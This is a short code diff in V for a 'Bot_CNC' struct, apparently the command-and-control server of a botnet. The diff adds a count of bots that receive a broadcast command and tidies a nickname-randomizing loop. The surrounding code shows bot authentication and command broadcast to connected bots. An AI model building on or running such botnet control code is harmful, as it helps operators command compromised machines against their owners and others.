@@ -102,9 +102,12 @@ pub fn (mut b Bot_CNC) bot_auth(mut bot_conn net.TcpConn, bot_pw string) {
 }
 
 pub fn (mut b Bot_CNC) broadcast_cmd(cmd string) int {
+	mut c := 0
 	for i in 0..b.nickname.len {
 		b.socket[i].write_string("${cmd}\r\n") or { 0 }
+		c++
 	}
+	println("[ + ] Cmd sent to ${c} bots")
 	return 1
 }
 
@@ -124,7 +127,7 @@ pub fn (mut b Bot_CNC) parse_buffer(buff string) (string, string, []string) {
 pub fn (mut b Bot_CNC) randomize_nick() string {
 	chars := "q,w,e,r,t,y,u,i,o,p,a,s,d,f,g,h,j,k,l,z,x,c,v,b,n,m,1,2,3,4,5,6,7,8,9,0".split(",")
 	mut random_nick := ""
-	for i in 0..15 {
+	for _ in 0..15 {
 		random_num := rand.int_in_range(0, chars.len) or { return "failed_nick" }
 		random_nick += chars[random_num]
 	}
